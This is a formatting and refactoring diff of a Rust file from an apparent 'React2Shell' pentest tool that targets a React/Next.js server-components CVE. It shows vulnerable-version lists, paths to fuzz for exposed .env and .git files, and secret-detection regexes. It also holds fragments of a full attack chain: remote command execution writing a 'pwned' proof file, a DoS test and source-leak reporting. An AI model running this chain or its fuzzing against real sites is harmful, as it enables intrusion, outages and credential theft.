@@ -207,46 +207,109 @@ pub struct ReportSummary {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /// Known vulnerable React versions (CVE-2025-55182).
-const VULNERABLE_REACT: &[&str] = &[
-    "19.0.0", "19.1.0", "19.1.1", "19.2.0", "18.3.0-canary",
-];
+const VULNERABLE_REACT: &[&str] = &["19.0.0", "19.1.0", "19.1.1", "19.2.0", "18.3.0-canary"];
 
 /// Known vulnerable Next.js versions (CVE-2025-55182).
 const VULNERABLE_NEXT: &[&str] = &[
     "14.3.0-canary",
-    "15.0.0", "15.0.1", "15.0.2", "15.0.3", "15.0.4",
-    "15.1.0", "15.1.1", "15.1.2", "15.1.3", "15.1.4",
-    "15.1.5", "15.1.6", "15.1.7", "15.1.8",
-    "15.2.0", "15.2.1", "15.2.2", "15.2.3", "15.2.4", "15.2.5",
-    "15.3.0", "15.3.1", "15.3.2", "15.3.3", "15.3.4", "15.3.5",
-    "15.4.0", "15.4.1", "15.4.2", "15.4.3", "15.4.4",
-    "15.4.5", "15.4.6", "15.4.7",
-    "15.5.0", "15.5.1", "15.5.2", "15.5.3", "15.5.4",
-    "15.5.5", "15.5.6",
-    "16.0.0", "16.0.1", "16.0.2", "16.0.3", "16.0.4",
-    "16.0.5", "16.0.6",
+    "15.0.0",
+    "15.0.1",
+    "15.0.2",
+    "15.0.3",
+    "15.0.4",
+    "15.1.0",
+    "15.1.1",
+    "15.1.2",
+    "15.1.3",
+    "15.1.4",
+    "15.1.5",
+    "15.1.6",
+    "15.1.7",
+    "15.1.8",
+    "15.2.0",
+    "15.2.1",
+    "15.2.2",
+    "15.2.3",
+    "15.2.4",
+    "15.2.5",
+    "15.3.0",
+    "15.3.1",
+    "15.3.2",
+    "15.3.3",
+    "15.3.4",
+    "15.3.5",
+    "15.4.0",
+    "15.4.1",
+    "15.4.2",
+    "15.4.3",
+    "15.4.4",
+    "15.4.5",
+    "15.4.6",
+    "15.4.7",
+    "15.5.0",
+    "15.5.1",
+    "15.5.2",
+    "15.5.3",
+    "15.5.4",
+    "15.5.5",
+    "15.5.6",
+    "16.0.0",
+    "16.0.1",
+    "16.0.2",
+    "16.0.3",
+    "16.0.4",
+    "16.0.5",
+    "16.0.6",
 ];
 
 /// Sensitive file paths to fuzz.
 const SENSITIVE_PATHS: &[&str] = &[
-    ".env", ".env.local", ".env.development", ".env.production", ".env.test",
-    ".git/config", ".git/HEAD", "package.json", "package-lock.json",
-    "docker-compose.yml", "Dockerfile", ".npmrc", "yarn.lock",
-    "next.config.js", "tsconfig.json", ".vscode/settings.json",
-    "web.config", "robots.txt",
+    ".env",
+    ".env.local",
+    ".env.development",
+    ".env.production",
+    ".env.test",
+    ".git/config",
+    ".git/HEAD",
+    "package.json",
+    "package-lock.json",
+    "docker-compose.yml",
+    "Dockerfile",
+    ".npmrc",
+    "yarn.lock",
+    "next.config.js",
+    "tsconfig.json",
+    ".vscode/settings.json",
+    "web.config",
+    "robots.txt",
 ];
 
 /// Secret detection patterns: (name, regex).
 const SECRET_PATTERNS: &[(&str, &str)] = &[
     ("Google API Key", r"AIza[0-9A-Za-z\-_]{35}"),
     ("Firebase URL", r"https://[a-z0-9\-]+\.firebaseio\.com"),
-    ("Slack Webhook", r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+"),
+    (
+        "Slack Webhook",
+        r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+",
+    ),
     ("AWS Access Key", r"AKIA[0-9A-Z]{16}"),
-    ("AWS Secret Key", r#"secret_?key\s*[:=]\s*['\"][0-9a-zA-Z/+]{40}['\"]"#),
-    ("JWT Token", r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*"),
+    (
+        "AWS Secret Key",
+        r#"secret_?key\s*[:=]\s*['\"][0-9a-zA-Z/+]{40}['\"]"#,
+    ),
+    (
+        "JWT Token",
+        r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*",
+    ),
     ("GitHub Token", r"gh[oprs]_[a-zA-Z0-9]{36,}"),
-    ("Discord Webhook", r"https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9\-]+"),
-    ("Generic API Key", r#"(?:api_?key|auth_?token|access_?token)\s*[:=]\s*['\"][0-9a-zA-Z\-_]{16,}['\"]"#),
+    (
+        "Discord Webhook",
+        r"https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9\-]+",
+    ),
+    (
+        "Generic API Key",
+        r#"(?:api_?key|auth_?token|access_?token)\s*[:=]\s*['\"][0-9a-zA-Z\-_]{16,}['\"]"#,
+    ),
 ];
 
 /// Sensitive data extraction patterns for source leak analysis.
@@ -260,9 +323,7 @@ const SOURCE_LEAK_PATTERNS: &[&str] = &[
 ];
 
 /// JavaScript file priority keywords (files matching these are scanned first).
-const JS_PRIORITY_KEYWORDS: &[&str] = &[
-    "framework", "main", "webpack", "app", "pages", "layout",
-];
+const JS_PRIORITY_KEYWORDS: &[&str] = &["framework", "main", "webpack", "app", "pages", "layout"];
 
 // ═════════════════════════════════════════════════════════════════════════════
 // ANSI Color Helpers
@@ -302,27 +363,27 @@ pub fn is_nextjs_vulnerable(version: &str) -> bool {
 
 /// Build a reqwest Client that skips TLS verification (pentesting mode).
 fn build_insecure_client() -> Result<Client> {
-    Client::builder()
+    crate::http_client_builder()
         .danger_accept_invalid_certs(true)
         .user_agent("React2Shell-Scanner/2.0 (Rust/Pentest)")
         .timeout(Duration::from_secs(15))
         .build()
-        .map_err(|e| WebAnalyzerError::Http(e))
+        .map_err(WebAnalyzerError::Http)
 }
 
 /// Build a reqwest Client with a custom timeout.
 fn build_client_with_timeout(secs: u64) -> Result<Client> {
-    Client::builder()
+    crate::http_client_builder()
         .danger_accept_invalid_certs(true)
         .user_agent("React2Shell-Scanner/2.0 (Rust/Pentest)")
         .timeout(Duration::from_secs(secs))
         .build()
-        .map_err(|e| WebAnalyzerError::Http(e))
+        .map_err(WebAnalyzerError::Http)
 }
 
 /// Return a context window around a match position in a string.
 fn context_window(text: &str, start: usize, end: usize, window: usize) -> String {
-    let s = if start > window { start - window } else { 0 };
+    let s = start.saturating_sub(window);
     let e = std::cmp::min(text.len(), end + window);
     text[s..e].to_string()
 }
@@ -376,9 +437,11 @@ impl React2ShellScanner {
             Ok(r) => r,
             Err(_) => {
                 self.add_detail("Header analysis: HEAD request failed, trying GET.");
-                self.client.get(&self.target).send().await.map_err(|e| {
-                    WebAnalyzerError::Http(e)
-                })?
+                self.client
+                    .get(&self.target)
+                    .send()
+                    .await
+                    .map_err(WebAnalyzerError::Http)?
             }
         };
 
@@ -402,10 +465,7 @@ impl React2ShellScanner {
                         source: self.target.clone(),
                         context: format!("x-powered-by: {}", x_powered_by),
                     });
-                    self.add_detail(&format!(
-                        "Next.js version detected from headers: {}",
-                        ver
-                    ));
+                    self.add_detail(&format!("Next.js version detected from headers: {}", ver));
                 }
             }
         }
@@ -438,13 +498,17 @@ impl React2ShellScanner {
 
     /// Fetch the target HTML and analyze embedded JS bundles for versions.
     pub async fn fetch_static_bundles(&mut self) -> Result<()> {
-        let resp = self.client.get(&self.target).send().await.map_err(|e| {
-            WebAnalyzerError::Http(e)
-        })?;
+        let resp = self
+            .client
+            .get(&self.target)
+            .send()
+            .await
+            .map_err(WebAnalyzerError::Http)?;
 
-        let html = resp.text().await.map_err(|e| {
-            WebAnalyzerError::Other(format!("Failed to read response body: {}", e))
-        })?;
+        let html = resp
+            .text()
+            .await
+            .map_err(|e| WebAnalyzerError::Other(format!("Failed to read response body: {}", e)))?;
 
         // Check generator meta tag for Next.js
         if let Ok(re) = Regex::new(
@@ -453,7 +517,12 @@ impl React2ShellScanner {
             if let Some(caps) = re.captures(&html) {
                 let ver = caps.get(1).unwrap().as_str().to_string();
                 if self.results.nextjs_version.is_none() {
-                    let ctx = context_window(&html, caps.get(0).unwrap().start(), caps.get(0).unwrap().end(), 30);
+                    let ctx = context_window(
+                        &html,
+                        caps.get(0).unwrap().start(),
+                        caps.get(0).unwrap().end(),
+                        30,
+                    );
                     self.results.nextjs_version = Some(VersionInfo {
                         version: ver.clone(),
                         source: self.target.clone(),
@@ -520,6 +589,16 @@ impl React2ShellScanner {
     async fn extract_versions_from_js(&mut self, initial_js_files: HashSet<String>) {
         let mut scanned: HashSet<String> = HashSet::new();
         let mut to_scan: Vec<String> = initial_js_files.into_iter().collect();
+        let new_js_re = Regex::new(r#"["'](/[a-zA-Z0-9_/\-\.]+\.js)["']"#).unwrap();
+        let chunk_re = Regex::new(r"static/chunks/[a-zA-Z0-9_/\-\.]+\.js").unwrap();
+        let pkg_re = Regex::new(
+            r"/\*!\s*(?:[A-Za-z0-9_\-\.\@\/]+\s+)?([a-zA-Z0-9_\-\.\@\/]+)\s+[vV]?([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)\s*\*/",
+        )
+        .unwrap();
+        let embedded_re = Regex::new(
+            r#"(?:name|pkg|package)\s*:\s*["']([a-zA-Z0-9_\-\.\@\/]+)["']\s*,\s*(?:version|ver)\s*:\s*["']([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)["']"#,
+        )
+        .unwrap();
 
         // Sort by priority keywords
         to_scan.sort_by(|a, b| {
@@ -551,9 +630,6 @@ impl React2ShellScanner {
             };
 
             // Discover new chunk references
-            let new_js_re = Regex::new(r#"["'](/[a-zA-Z0-9_/\-\.]+\.js)["']"#).unwrap();
-            let chunk_re = Regex::new(r"static/chunks/[a-zA-Z0-9_/\-\.]+\.js").unwrap();
-
             for m in new_js_re.find_iter(&js_content) {
                 let path = m.as_str().trim_matches(&['"', '\''][..]).to_string();
                 if !scanned.contains(&path) && !to_scan.contains(&path) {
@@ -575,11 +651,6 @@ impl React2ShellScanner {
             });
 
             // Extract package versions via /*! ... */ banner comments
-            let pkg_re = Regex::new(
-                r"/\*!\s*(?:[A-Za-z0-9_\-\.\@\/]+\s+)?([a-zA-Z0-9_\-\.\@\/]+)\s+[vV]?([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)\s*\*/",
-            )
-            .unwrap();
-
             for caps in pkg_re.captures_iter(&js_content) {
                 let name = caps.get(1).unwrap().as_str().to_string();
                 let version = caps.get(2).unwrap().as_str().to_string();
@@ -601,15 +672,11 @@ impl React2ShellScanner {
             }
 
             // Extract embedded package.json-style definitions
-            let embedded_re = Regex::new(
-                r#"(?:name|pkg|package)\s*:\s*["']([a-zA-Z0-9_\-\.\@\/]+)["']\s*,\s*(?:version|ver)\s*:\s*["']([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)["']"#,
-            )
-            .unwrap();
-
             for caps in embedded_re.captures_iter(&js_content) {
                 let name = caps.get(1).unwrap().as_str().to_string();
                 let version = caps.get(2).unwrap().as_str().to_string();
-                if name.len() > 1 && version.len() > 1
+                if name.len() > 1
+                    && version.len() > 1
                     && !self.results.dependencies.iter().any(|d| d.name == name)
                 {
                     let ctx = context_window(
@@ -653,7 +720,9 @@ impl React2ShellScanner {
                     if let Ok(data) = resp.json::<serde_json::Value>().await {
                         if let Some(versions) = data.get("version") {
                             if self.results.react_version.is_none() {
-                                if let Some(react_ver) = versions.get("react").and_then(|v| v.as_str()) {
+                                if let Some(react_ver) =
+                                    versions.get("react").and_then(|v| v.as_str())
+                                {
                                     self.results.react_version = Some(VersionInfo {
                                         version: react_ver.to_string(),
                                         source: health_url.clone(),
@@ -666,7 +735,9 @@ impl React2ShellScanner {
                                 }
                             }
                             if self.results.nextjs_version.is_none() {
-                                if let Some(next_ver) = versions.get("next").and_then(|v| v.as_str()) {
+                                if let Some(next_ver) =
+                                    versions.get("next").and_then(|v| v.as_str())
+                                {
                                     self.results.nextjs_version = Some(VersionInfo {
                                         version: next_ver.to_string(),
                                         source: health_url.clone(),
@@ -687,11 +758,26 @@ impl React2ShellScanner {
 
     fn try_extract_react_version(&mut self, js_content: &str, source_url: &str) {
         let patterns = [
-            (r"react(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
-            (r#"reconcilerVersion\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
-            (r#"(?:version|ReactVersion)\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
-            (r#""react"\s*:\s*"[^"]*(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#, false),
-            (r"react-dom(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
+            (
+                r"react(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)",
+                false,
+            ),
+            (
+                r#"reconcilerVersion\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#,
+                true,
+            ),
+            (
+                r#"(?:version|ReactVersion)\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#,
+                true,
+            ),
+            (
+                r#""react"\s*:\s*"[^"]*(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#,
+                false,
+            ),
+            (
+                r"react-dom(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)",
+                false,
+            ),
         ];
 
         for (pattern, requires_react_context) in &patterns {
@@ -746,10 +832,22 @@ impl React2ShellScanner {
 
     fn try_extract_nextjs_version(&mut self, js_content: &str, source_url: &str) {
         let patterns = [
-            (r"next(?:@|[\s\-\_]*v?)(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
-            (r#"window\.next\s*=\s*\{.*?version:\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, false),
-            (r#"(?:__NEXT_VERSION|nextVersion|version)\s*[:=]\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
-            (r#""next"\s*:\s*"[^"]*(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#, false),
+            (
+                r"next(?:@|[\s\-\_]*v?)(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)",
+                false,
+            ),
+            (
+                r#"window\.next\s*=\s*\{.*?version:\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#,
+                false,
+            ),
+            (
+                r#"(?:__NEXT_VERSION|nextVersion|version)\s*[:=]\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#,
+                true,
+            ),
+            (
+                r#""next"\s*:\s*"[^"]*(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#,
+                false,
+            ),
         ];
 
         for (pattern, requires_nextjs_context) in &patterns {
@@ -818,10 +916,7 @@ impl React2ShellScanner {
                             source: source_url.to_string(),
                             context: ctx,
                         });
-                        self.add_detail(&format!(
-                            "Secret detected: {} ({})",
-                            name, source_url
-                        ));
+                        self.add_detail(&format!("Secret detected: {} ({})", name, source_url));
                     }
                 }
             }
@@ -901,23 +996,20 @@ impl React2ShellScanner {
                     if content_type.contains("text/html") {
                         continue;
                     }
-                    match resp.text().await {
-                        Ok(body) => {
-                            if body.len() < 100 || !body[..100].to_lowercase().contains("<html") {
-                                let ctx = if body.len() > 200 {
-                                    format!("{}...", &body[..200])
-                                } else {
-                                    body.clone()
-                                };
-                                self.results.exposed_files.push(ExposedFile {
-                                    path: path.to_string(),
-                                    url: url.clone(),
-                                    context: ctx,
-                                });
-                                self.add_detail(&format!("Exposed sensitive file: {} ({})", path, url));
-                            }
+                    if let Ok(body) = resp.text().await {
+                        if body.len() < 100 || !body[..100].to_lowercase().contains("<html") {
+                            let ctx = if body.len() > 200 {
+                                format!("{}...", &body[..200])
+                            } else {
+                                body.clone()
+                            };
+                            self.results.exposed_files.push(ExposedFile {
+                                path: path.to_string(),
+                                url: url.clone(),
+                                context: ctx,
+                            });
+                            self.add_detail(&format!("Exposed sensitive file: {} ({})", path, url));
                         }
-                        Err(_) => {}
                     }
                 }
                 _ => {}
@@ -960,12 +1052,19 @@ impl React2ShellScanner {
         }
         // Likely vulnerable: known vulnerable version, even if RSC not confirmed
         else if is_react_vuln || is_next_vuln {
-            self.add_detail("Vulnerable framework version used. RSC endpoint not confirmed but high risk.");
+            self.add_detail(
+                "Vulnerable framework version used. RSC endpoint not confirmed but high risk.",
+            );
             self.results.vulnerable = true;
         }
         // Potential: Next.js confirmed, RSC active, but version unknown
-        else if self.results.is_nextjs && self.results.rsc_enabled && self.results.nextjs_version.is_none() {
-            self.add_detail("Version unknown but RSC active. Potentially vulnerable (Next.js 15+).");
+        else if self.results.is_nextjs
+            && self.results.rsc_enabled
+            && self.results.nextjs_version.is_none()
+        {
+            self.add_detail(
+                "Version unknown but RSC active. Potentially vulnerable (Next.js 15+).",
+            );
             self.results.vulnerable = true;
         }
         // Unknown RSC state but version undetermined
@@ -973,7 +1072,9 @@ impl React2ShellScanner {
             && self.results.react_version.is_none()
             && self.results.nextjs_version.is_none()
         {
-            self.add_detail("Versions not detected but RSC is active. Manual verification recommended.");
+            self.add_detail(
+                "Versions not detected but RSC is active. Manual verification recommended.",
+            );
         }
     }
 
@@ -1009,7 +1110,7 @@ pub async fn run_recon(target: &str) -> Result<ReconResult> {
     let mut rsc_endpoints: Vec<RscEndpoint> = Vec::new();
 
     // Check /api/health first
-    if let Ok(resp) = client.get(&format!("{}/api/health", target)).send().await {
+    if let Ok(resp) = client.get(format!("{}/api/health", target)).send().await {
         if resp.status().is_success() {
             if let Ok(data) = resp.json::<serde_json::Value>().await {
                 if let Some(versions) = data.get("version") {
@@ -1031,8 +1132,7 @@ pub async fn run_recon(target: &str) -> Result<ReconResult> {
         if resp.status().is_success() {
             if let Ok(html) = resp.text().await {
                 // Check Next.js App Router
-                if html.contains("_next/static/chunks/app/")
-                    || html.contains("app-pages-internals")
+                if html.contains("_next/static/chunks/app/") || html.contains("app-pages-internals")
                 {
                     is_app_router = true;
                 }
@@ -1057,9 +1157,10 @@ pub async fn run_recon(target: &str) -> Result<ReconResult> {
     }
 
     // Check RSC endpoint
-    let mut rsc_headers: Vec<(&str, &str)> = Vec::new();
-    rsc_headers.push(("Content-Type", "text/x-component"));
-    rsc_headers.push(("Next-Action", "dummy-action-id"));
+    let rsc_headers: Vec<(&str, &str)> = vec![
+        ("Content-Type", "text/x-component"),
+        ("Next-Action", "dummy-action-id"),
+    ];
 
     let mut req = client.post(&target).body("[]".to_string());
     for (k, v) in &rsc_headers {
@@ -1073,13 +1174,12 @@ pub async fn run_recon(target: &str) -> Result<ReconResult> {
             .and_then(|v| v.to_str().ok())
             .unwrap_or("");
         if ct.contains("text/x-component")
-            || (resp.status().as_u16() >= 400
-                && resp.status().as_u16() < 600
-                && {
-                    resp.text().await
-                        .map(|b| b.contains("Server Action") || b.contains("Error"))
-                        .unwrap_or(false)
-                })
+            || (resp.status().as_u16() >= 400 && resp.status().as_u16() < 600 && {
+                resp.text()
+                    .await
+                    .map(|b| b.contains("Server Action") || b.contains("Error"))
+                    .unwrap_or(false)
+            })
         {
             rsc_endpoints.push(RscEndpoint {
                 path: "/".to_string(),
@@ -1287,10 +1387,7 @@ pub fn build_rce_payload(command: &str) -> String {
 }
 
 /// Execute a command via RCE (demo/educational mode).
-pub async fn execute_rce_command(
-    target: &str,
-    command: &str,
-) -> Result<RceCommandOutput> {
+pub async fn execute_rce_command(target: &str, command: &str) -> Result<RceCommandOutput> {
     let target = target.trim_end_matches('/').to_string();
     let client = build_client_with_timeout(10)?;
 
@@ -1345,8 +1442,8 @@ pub async fn execute_rce(target: &str) -> Result<RceResult> {
         Utc::now().to_rfc3339()
     );
     let poc_result = execute_rce_command(&target, &poc_cmd).await?;
-    let poc_created = poc_result.exit_code == 0
-        && poc_result.output.contains("react2shell_pwned.txt");
+    let poc_created =
+        poc_result.exit_code == 0 && poc_result.output.contains("react2shell_pwned.txt");
 
     outputs.push(poc_result);
 
@@ -1570,15 +1667,15 @@ pub fn generate_report(
 
 /// Serialize a report to a JSON string.
 pub fn report_to_json(report: &AttackReport) -> Result<String> {
-    serde_json::to_string_pretty(report).map_err(|e| WebAnalyzerError::Json(e))
+    serde_json::to_string_pretty(report).map_err(WebAnalyzerError::Json)
 }
 
 /// Save a report to a JSON file.
 pub async fn save_report(report: &AttackReport, path: &str) -> Result<()> {
     let json = report_to_json(report)?;
-    tokio::fs::write(path, json).await.map_err(|e| {
-        WebAnalyzerError::Other(format!("Failed to write report to {}: {}", path, e))
-    })
+    tokio::fs::write(path, json)
+        .await
+        .map_err(|e| WebAnalyzerError::Other(format!("Failed to write report to {}: {}", path, e)))
 }
 
 // ── Console Report Formatting ───────────────────────────────────────────────
@@ -1586,12 +1683,7 @@ pub async fn save_report(report: &AttackReport, path: &str) -> Result<()> {
 /// Print a scan result to the console with ANSI colors.
 pub fn print_scan_result(result: &ScanResult) {
     println!("\n{}", "=".repeat(50));
-    println!(
-        "Target: {}{}{}",
-        Color::CYAN,
-        result.url,
-        Color::RESET
-    );
+    println!("Target: {}{}{}", Color::CYAN, result.url, Color::RESET);
 
     if !result.is_nextjs {
         println!(
@@ -1680,22 +1772,12 @@ pub fn print_scan_result(result: &ScanResult) {
             Color::RESET
         );
         for f in &result.exposed_files {
-            println!(
-                "  - {}{}{} -> {}",
-                Color::RED,
-                f.path,
-                Color::RESET,
-                f.url
-            );
+            println!("  - {}{}{} -> {}", Color::RED, f.path, Color::RESET, f.url);
         }
     }
 
     if !result.secrets.is_empty() {
-        println!(
-            "\n[{}!{}] Detected Secrets:",
-            Color::RED,
-            Color::RESET
-        );
+        println!("\n[{}!{}] Detected Secrets:", Color::RED, Color::RESET);
         for s in &result.secrets {
             let truncated = if s.value.len() > 40 {
                 format!("{}...", &s.value[..40])
@@ -1745,11 +1827,7 @@ pub fn print_full_chain_result(result: &FullChainResult) {
         Color::MAGENTA,
         Color::RESET
     );
-    println!(
-        "{}  Full Chain Attack Report{}",
-        Color::BOLD,
-        Color::RESET
-    );
+    println!("{}  Full Chain Attack Report{}", Color::BOLD, Color::RESET);
     println!(
         "{}══════════════════════════════════════════════{}\n",
         Color::MAGENTA,
@@ -1758,10 +1836,7 @@ pub fn print_full_chain_result(result: &FullChainResult) {
 
     println!("Target: {}{}{}", Color::CYAN, result.target, Color::RESET);
     println!("Timestamp: {}", result.timestamp);
-    println!(
-        "Total Duration: {}ms",
-        result.total_duration_ms
-    );
+    println!("Total Duration: {}ms", result.total_duration_ms);
 
     for phase in &result.phases {
         let status_icon = if phase.success {
@@ -1771,10 +1846,7 @@ pub fn print_full_chain_result(result: &FullChainResult) {
         };
         println!(
             "  {} Phase '{}' — {}ms — {}",
-            status_icon,
-            phase.phase,
-            phase.duration_ms,
-            phase.details
+            status_icon, phase.phase, phase.duration_ms, phase.details
         );
     }
 
@@ -1846,11 +1918,7 @@ pub fn print_recon_result(result: &ReconResult) {
             Color::RESET
         );
     } else {
-        println!(
-            "{}RSC: Uncertain or passive{}",
-            Color::YELLOW,
-            Color::RESET
-        );
+        println!("{}RSC: Uncertain or passive{}", Color::YELLOW, Color::RESET);
     }
 
     println!("\n{}", "=".repeat(50));
@@ -1894,36 +1962,23 @@ pub fn print_source_leak_result(result: &SourceLeakResult) {
             Color::RESET
         );
         for finding in &result.findings {
-            println!(
-                "  {}>{} {}",
-                Color::RED,
-                Color::RESET,
-                finding.context
-            );
+            println!("  {}>{} {}", Color::RED, Color::RESET, finding.context);
         }
     }
 
-    println!(
-        "Bytes leaked: {}",
-        result.bytes_leaked
-    );
+    println!("Bytes leaked: {}", result.bytes_leaked);
 }
 
 /// Print a DoS result to console.
 pub fn print_dos_result(result: &DosResult) {
-    println!("\n{}--- DoS Test Results ---{}", Color::YELLOW, Color::RESET);
     println!(
-        "Baseline response: {}ms",
-        result.baseline_ms
+        "\n{}--- DoS Test Results ---{}",
+        Color::YELLOW,
+        Color::RESET
     );
-    println!(
-        "Attack response: {}ms",
-        result.attack_elapsed_ms
-    );
-    println!(
-        "Effect multiplier: {:.1}x",
-        result.effect_multiplier
-    );
+    println!("Baseline response: {}ms", result.baseline_ms);
+    println!("Attack response: {}ms", result.attack_elapsed_ms);
+    println!("Effect multiplier: {:.1}x", result.effect_multiplier);
 
     if result.dos_successful {
         println!(
@@ -1937,9 +1992,7 @@ pub fn print_dos_result(result: &DosResult) {
             if result.server_recovered { "Yes" } else { "No" }
         );
     } else {
-        println!(
-            "No significant DoS effect observed."
-        );
+        println!("No significant DoS effect observed.");
     }
 }
 
@@ -1948,22 +2001,12 @@ pub fn print_rce_result(result: &RceResult) {
     println!("\n{}--- RCE Results ---{}", Color::RED, Color::RESET);
 
     for output in &result.command_outputs {
-        println!(
-            "{}Command:{} {}",
-            Color::BOLD,
-            Color::RESET,
-            output.command
-        );
+        println!("{}Command:{} {}", Color::BOLD, Color::RESET, output.command);
         if !output.output.is_empty() {
             println!("{}", output.output);
         }
         if !output.error.is_empty() {
-            println!(
-                "{}Error:{} {}",
-                Color::RED,
-                Color::RESET,
-                output.error
-            );
+            println!("{}Error:{} {}", Color::RED, Color::RESET, output.error);
         }
     }
 
@@ -1999,10 +2042,7 @@ pub async fn scan_and_report(target: &str, verbose: bool) -> Result<AttackReport
 }
 
 /// Run the full attack chain (scan + all phases) and generate a report.
-pub async fn scan_and_attack(
-    target: &str,
-    include_dos: bool,
-) -> Result<AttackReport> {
+pub async fn scan_and_attack(target: &str, include_dos: bool) -> Result<AttackReport> {
     // Run scan first
     let mut scanner = React2ShellScanner::new(target).await?;
     let scan_result = scanner.scan().await?;
